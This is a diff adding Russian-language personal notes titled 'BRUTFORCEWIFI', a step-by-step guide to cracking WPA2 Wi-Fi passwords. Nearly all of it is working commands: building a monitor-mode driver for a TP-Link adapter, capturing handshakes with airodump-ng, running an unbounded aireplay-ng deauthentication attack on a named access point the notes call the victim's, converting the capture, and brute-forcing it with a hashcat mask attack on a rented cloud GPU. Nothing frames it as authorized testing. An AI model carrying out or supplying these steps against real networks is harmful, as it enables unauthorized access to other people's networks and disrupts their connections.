@@ -1,0 +1,125 @@
+                                                                BRUTFORCEWIFI
+
+ Открываем чистую Linux машину
+ Для удобства подключаем и скaчиваем графический интерфейс, ctrl+c, ctrl+v, создать общую папку для передачи файлов.
+ Сайты для помощи: 
+https://2domains.ru/support/vps-i-servery/kak-podklyuchit-obshchuyu-papku-v-virtualbox
+https://omgubuntu.ru/kak-ispravit-oshibku-e-could-not-get-lock-var-lib-dpkg-lock-v-ubuntu-linux/
+https://spy-soft.net/hashcat-ubuntu/
+https://losst.pro/kak-raspakovat-7z-v-linux
+https://hashcat.net/wiki/doku.php?id=mask_attack
+https://node-security.com/posts/cracking-wpa2-with-hashcat/
+https://gitlab.com/kalilinux/packages/hcxtools
+https://immers.cloud/vm/
+https://github.com/davidbombal/Kali-Linux/blob/main/TP-Link%20TL-WN722N%20adapter
+https://www.youtube.com/watch?v=WfYxrLaqlN8&list=RDCMUCP7WmQ_U4GB3K51Od9QvM0w&start_radio=1&t=696s
+https://www.youtube.com/watch?v=J8A8rKFZW-M
+https://www.youtube.com/watch?v=JdpXhRLiJjo&t=7s
+https://beget.com/ru/kb/how-to/ssh/kak-podklyuchitsya-po-ssh-iz-windows#ustanovka-putty
+https://hackware.ru/?p=60
+https://www.youtube.com/watch?v=nHDixd-EdEQ
+https://hashcat.net/forum/thread-7717.html
+https://omgubuntu.ru/ustanovitie-i-ispolzuitie-wireshark-v-ubuntu-linux/
+https://github.com/ZerBea/hcxtools/issues/96
+https://github.com/ZerBea/hcxdumptool
+https://github.com/ZerBea/hcxtools
+https://www.youtube.com/watch?v=Usw0IlGbkC4
+
+                                                    Для брута файла *.hc22000 (на immers cloud)
+
+ устанавливаем hashcat:
+wget https://hashcat.net/files/hashcat-6.2.6.7z
+ устанавливаем 7z:
+sudo apt install p7zip-full
+ разархивируем hashcat:
+p7zip -d hashcat-6.2.6.7z
+ начинаем брутфорс по заранее подготовленному файлу на вертуальной машине:
+./hashcat.bin -m 22000 /home/ubuntu/WIFI/wifiHashes.22000 -a 3 --increment --increment-min 8 --increment-max 9 -1 ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 ?1?1?1?1?1?1?1?1 -d 1 -w 4
+
+                                                    Установка прошивки для работы в режиме monitor
+
+ Я использую wifi adapter TP-Link TL-WN722N, поэтому покажу установку прошивки именно для него:
+(
+sudo apt update && sudo apt upgrade
+reboot
+sudo apt install dkms git linux-headers-amd64
+echo 'blacklist r8188eu'|sudo tee -a '/etc/modprobe.d/realtek.conf'
+git clone https://github.com/aircrack-ng/rtl8188eus
+cd rtl8188eus
+sudo ./dkms-install.sh
+reboot
+) тоже рабочий способ
+
+sudo apt update
+sudo apt upgrade
+sudo apt install bc
+sudo apt-get install build-essential 
+sudo apt-get install libelf-dev 
+sudo apt-get install linux-headers-`uname -r` "так вы узнаете какой версии ваш линукс"
+sudo apt-get install linux-headers-5.15.0-67-generic
+sudo apt install dkms
+sudo rmmod r8188eu.ko "необходимо подключить Wifi adapter к вертуальной машине(Устройства-USB-uname)"
+apt install git
+git clone https://github.com/aircrack-ng/rtl8188eus
+cd rtl8188eus
+sudo -i
+echo "blacklist r8188eu" > "/etc/modprobe.d/realtek.conf"
+exit
+sudo reboot
+sudo apt update
+cd rtl8188eus
+sudo make
+sudo make install
+sudo modprobe 8188eu (установка завершена)
+
+                                                   Переводим WIFI adapter в Mode:Monitor
+
+ Для начала нужно перевести wifi adapter в monitor mode:
+apt install net-tools
+apt install aircrack-ng
+iwconfig (так мы узнаем название нашего wifi adapter(у меня wlxd03745c0b9f4))
+sudo ifconfig wlxd03745c0b9f4 down
+sudo airmon-ng check kill
+sudo iwconfig wlxd03745c0b9f4 mode monitor
+sudo ifconfig wlxd03745c0b9f4 up
+iwconfig (Теперь Mode:Monitor)
+ Как вернуть беспроводную карту в управляемый режим (Managed)(Что-бы работал интеренет)
+ifconfig wlxd03745c0b9f4 down
+iwconfig wlxd03745c0b9f4 mode managed
+ifconfig wlxd03745c0b9f4 up
+(   если проблемы с WIFI
+sudo systemctl start/stop NetworkManager.service
+sudo systemctl start/stop wpa_supplicant.service   )
+                                                                Добыча HANDSHAKE
+
+ Начинаем в 1 окне:
+sudo airodump-ng wlxd03745c0b9f4 (ждем пока в строке ESSID появиться точка испытуемой жертвы)
+sudo airodump-ng -w test -c 8 --bssid DE:7C:CE:F6:78:41  wlxd03745c0b9f4 (-c ch, -w создаем файлы)(запустить в отдельном терминале)
+sudo aireplay-ng --deauth 0 -a DE:7C:CE:F6:78:41 wlxd03745c0b9f4 (не выключать предыдущую команду)
+test-01.cap (полученый файл нам и нужен) 
+iwconfig wlxd03745c0b9f4 channel 8 (если пишет что канал зафиксирован)
+
+                                         Проверим наличие всех четырех рукопожатий eapol в wireshark
+
+sudo add-apt-repository ppa:wireshark-dev/stable
+sudo apt update
+sudo apt install wireshark
+sudo wireshark (запускаем wirshark и ищем полученый файл *.cap, затем в строке поиска пишем eapol(если есть все 4 то файл готов к преобразованию(message 1, 2, 3, 4)))
+
+                                                    Преобразование *.cap в *.hc22000
+ Начнем
+git clone https://gitlab.com/kalilinux/packages/hcxtools.git
+apt-get install libcurl4-openssl-dev libssl-dev zlib1g-dev (если вылезла ошибка hcxpcapngtool.c:20:10: fatal error: openssl/sha.h: No such file or directory)
+cd hcxtools
+make
+make install
+заходим в папку где хранится файл *.cap
+cd
+hcxpcapngtool test-08.cap -o /home/fkbr2014/preobrazovanie.hc22000 (последнее это куда файл преобразутся и сохранится)
+   (если проблему с openssl решить не удалось, то выполняем следующие шаги)
+(есть сайт https://hashcat.net/cap2hashcat/index.pl) забиваем в кнопку browse наш файл *.cap и загружаем кнопкой convert
+
+
+
+
+
